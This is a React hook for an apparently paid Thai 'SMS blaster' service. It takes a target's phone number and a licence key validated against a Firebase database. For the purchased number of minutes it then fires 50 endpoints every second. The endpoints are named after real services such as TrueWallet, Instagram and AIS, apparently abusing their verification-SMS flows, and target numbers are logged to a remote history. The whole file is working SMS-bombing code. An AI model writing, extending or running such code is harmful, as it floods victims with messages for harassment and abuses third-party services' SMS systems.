import { useState, useRef, useEffect } from "react";
import { useToast } from "@/components/ui/use-toast";
import axios from "axios";
import {
  api1, api2, api3, api4, api5, api6, api7, api8, api9, api10,
  api11, api12, api13, api14, api15, api16, api17, api18, api19, api20,
  api21, api22, api23, api24, api25, api26, api27, api28, api29, api30,
  api31, api32, api33, api34, api35, api36, api37, api38, api39, api40,
  api41, api42, api43, api44, api45, api46, api47, api48, api49, api50
} from "@/services/smsAPIs";

interface LogEntry {
  timestamp: string;
  phone: string;
  status: 'success' | 'error';
  message: string;
}

interface PhoneReport {
  reason: string;
  count: number;
}

interface PhoneHistory {
  phone: string;
  timestamp: number;
  status: 'success' | 'error';
}

export const useSMSBlaster = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [minutes, setMinutes] = useState("1");
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [remainingTime, setRemainingTime] = useState<number>(0);
  const [apiKey, setApiKey] = useState("");
  const [showKeyInput, setShowKeyInput] = useState(false);
  const [phoneReport, setPhoneReport] = useState<PhoneReport | null>(null);
  const [phoneHistory, setPhoneHistory] = useState<Set<string>>(new Set());
  const timerRef = useRef<NodeJS.Timeout>();
  const { toast } = useToast();

  useEffect(() => {
    loadPhoneHistory();
    const cleanupInterval = setInterval(cleanupOldRecords, 3600000);
    return () => clearInterval(cleanupInterval);
  }, []);

  const loadPhoneHistory = async () => {
    try {
      const response = await axios.get('https://goak-71ac8-default-rtdb.firebaseio.com/history.json');
      if (response.data) {
        const history = Object.values(response.data) as PhoneHistory[];
        const phones = new Set(history.map((h: PhoneHistory) => h.phone));
        setPhoneHistory(phones);
      }
    } catch (error) {
      console.error('Error loading history:', error);
    }
  };

  const saveToHistory = async (phone: string, status: 'success' | 'error') => {
    try {
      const timestamp = Date.now();
      const historyEntry = { phone, timestamp, status };
      await axios.post('https://goak-71ac8-default-rtdb.firebaseio.com/history.json', historyEntry);
    } catch (error) {
      console.error('Error saving to history:', error);
    }
  };

  const cleanupOldRecords = async () => {
    try {
      const oneDayAgo = Date.now() - 86400000;
      const response = await axios.get('https://goak-71ac8-default-rtdb.firebaseio.com/history.json');
      if (response.data) {
        const entries = Object.entries(response.data);
        for (const [key, value] of entries) {
          if ((value as PhoneHistory).timestamp < oneDayAgo) {
            await axios.delete(`https://goak-71ac8-default-rtdb.firebaseio.com/history/${key}.json`);
          }
        }
      }
    } catch (error) {
      console.error('Error cleaning up old records:', error);
    }
  };

  const addLog = async (phone: string, status: 'success' | 'error', message: string) => {
    setLogs(prev => {
      const newLog = { timestamp: new Date().toLocaleTimeString(), phone, status, message };
      const newLogs = [newLog, ...prev].slice(0, 50);
      return newLogs;
    });
    
    await saveToHistory(phone, status);
    setPhoneHistory(prev => new Set(prev.add(phone)));
  };

  const validatePhoneNumber = (number: string) => {
    const regex = /^0\d{9}$/;
    return regex.test(number);
  };

  const checkPhoneReport = async (phone: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/reports/${phone}.json`);
      if (response.data) {
        setPhoneReport(response.data);
        setShowKeyInput(true);
        toast({
          title: "⚠️ คำเตือน",
          description: `เบอร์นี้ถูกรายงานว่า: ${response.data.reason}`,
          variant: "destructive",
        });
      } else {
        setShowKeyInput(true);
      }
    } catch (error) {
      console.error("Error checking phone report:", error);
      setShowKeyInput(true);
    }
  };

  const validateApiKey = async (key: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${key}.json`);
      if (response.data && response.data.active) {
        const expireDate = new Date(response.data.expireDate);
        if (expireDate > new Date()) {
          const totalMinutes = response.data.totalMinutes || 0;
          const usedMinutes = response.data.usedMinutes || 0;
          const requestedMinutes = parseInt(minutes);
          
          if (usedMinutes + requestedMinutes > totalMinutes) {
            toast({
              title: "เวลาไม่เพียงพอ",
              description: `คีย์นี้เหลือเวลาใช้งานได้อีก ${totalMinutes - usedMinutes} นาที`,
              variant: "destructive",
            });
            return false;
          }
          return true;
        } else {
          toast({
            title: "API Key หมดอายุ",
            description: "กรุณาติดต่อแอดมินเพื่อต่ออายุ Key",
            variant: "destructive",
          });
          return false;
        }
      }
      toast({
        title: "API Key ไม่ถูกต้อง",
        description: "กรุณาตรวจสอบ Key ของท่าน",
        variant: "destructive",
      });
      return false;
    } catch (error) {
      console.error("Error validating API key:", error);
      return false;
    }
  };

  const updateUsedMinutes = async () => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${apiKey}.json`);
      if (response.data) {
        const currentUsedMinutes = response.data.usedMinutes || 0;
        const newUsedMinutes = currentUsedMinutes + parseInt(minutes);
        await axios.patch(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${apiKey}.json`, { usedMinutes: newUsedMinutes });
      }
    } catch (error) {
      console.error("Error updating used minutes:", error);
    }
  };

  const startSMSBlast = async () => {
    setLoading(true);
    const totalSeconds = parseInt(minutes) * 60;
    setRemainingTime(totalSeconds);
    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS เป็นเวลา ${minutes} นาที`);
    
    await updateUsedMinutes();
    
    const countdownInterval = setInterval(() => {
      setRemainingTime(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    const sendSMS = async () => {
      const endpoints = [
        { api: api1, name: 'Lotus\'s' },
        { api: api2, name: 'TrueWallet' },
        { api: api3, name: '1112' },
        { api: api4, name: 'CH3+' },
        { api: api5, name: 'Instagram' },
        { api: api6, name: 'Freshket' },
        { api: api7, name: 'TrueShopping' },
        { api: api8, name: 'HDMall' },
        { api: api9, name: 'Lotus' },
        { api: api10, name: 'Joox' },
        // Add the remaining APIs
        { api: api11, name: 'MTS Blockchain' },
        { api: api12, name: 'MakroClick' },
        { api: api13, name: 'Ulive' },
        { api: api14, name: 'TrueWallet' },
        { api: api15, name: 'Vaccine' },
        { api: api16, name: 'AIS' },
        { api: api17, name: 'KaitoraSap' },
        { api: api18, name: 'Konvy' },
        { api: api19, name: '1112' },
        { api: api20, name: 'MSport1688' },
        { api: api21, name: 'Ep789bet' },
        { api: api22, name: 'The Concert' },
        { api: api23, name: 'JD Baa' },
        { api: api24, name: 'MakroClick' },
        { api: api25, name: 'SSO' },
        { api: api26, name: 'TGfone' },
        { api: api27, name: 'Khonde' },
        { api: api28, name: 'GamingNation' },
        { api: api29, name: 'CH3Plus' },
        { api: api30, name: 'CMTrade' },
        { api: api31, name: 'BigThailand' },
        { api: api32, name: 'Cognito' },
        { api: api33, name: 'Vegas77Slots' },
        { api: api34, name: 'MakroClick' },
        { api: api35, name: 'MSport1688' },
        { api: api36, name: '1112Delivery' },
        { api: api37, name: 'Iship' },
        { api: api38, name: 'Chobrod' },
        { api: api39, name: 'BkkApi' },
        { api: api40, name: 'Fairdee' },
        { api: api41, name: '24fix' },
        { api: api42, name: 'CTrueshop' },
        { api: api43, name: 'Iship' },
        { api: api44, name: 'BkkApi' },
        { api: api45, name: 'CTrueshop' },
        { api: api46, name: 'KSIT' },
        { api: api47, name: 'Giztix' },
        { api: api48, name: 'TrainFlix' },
        { api: api49, name: 'DSO' },
        { api: api50, name: '24fix' },
      ];

      for (const { api, name } of endpoints) {
        try {
          await api(phoneNumber);
          addLog(phoneNumber, 'success', `✓ ส่ง SMS สำเร็จผ่าน ${name}`);
        } catch (error) {
          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${name}`);
          console.error(`Error with endpoint ${name}:`, error);
        }
      }
    };

    const smsInterval = setInterval(async () => {
      await sendSMS();
    }, 1000);

    setTimeout(() => {
      clearInterval(smsInterval);
      clearInterval(countdownInterval);
      setLoading(false);
      setRemainingTime(0);
      addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
      toast({
        title: "สำเร็จ",
        description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
      });
    }, totalSeconds * 1000);
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "หมายเลขโทรศัพท์ไม่ถูกต้อง",
        description: "กรุณากรอกหมายเลขโทรศัพท์ 10 หลัก ที่ขึ้นต้นด้วย 0",
        variant: "destructive",
      });
      return;
    }

    await checkPhoneReport(phoneNumber);
  };

  const handleApiKeySubmit = async () => {
    if (await validateApiKey(apiKey)) {
      startSMSBlast();
    }
  };

  return {
    phoneNumber,
    setPhoneNumber,
    minutes,
    setMinutes,
    loading,
    logs,
    remainingTime,
    apiKey,
    setApiKey,
    showKeyInput,
    phoneReport,
    phoneHistory,
    handlePhoneSubmit,
    handleApiKeySubmit,
  };
};
